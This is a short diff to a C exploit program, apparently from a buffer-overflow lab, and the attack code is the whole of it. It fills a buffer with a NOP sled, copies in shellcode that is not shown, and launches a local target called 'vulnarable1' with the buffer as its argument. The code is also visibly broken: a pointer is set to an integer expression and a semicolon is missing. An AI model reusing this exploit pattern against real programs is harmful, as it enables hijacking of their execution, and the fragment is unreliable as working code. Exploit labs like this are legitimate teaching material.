@@ -46,6 +46,12 @@ for(i=0;i<bsize-RANGE*2-strlen(shellcode)-1;i++)
 		buff[i]='\x90';
 		
 	ptr=buff=bsize-RANGE*2-strlen(shellcode)-1;
-	
-	 }
+	for(i=0;i<strlen(shellcode);i++)
+        *(ptr++)=shellcode[i];	
+        
+        buff[bsize-1]='\0'
+        
+execl("./vulnarable1","./vulnarable1",buff,0);
+	 
+}
 	 
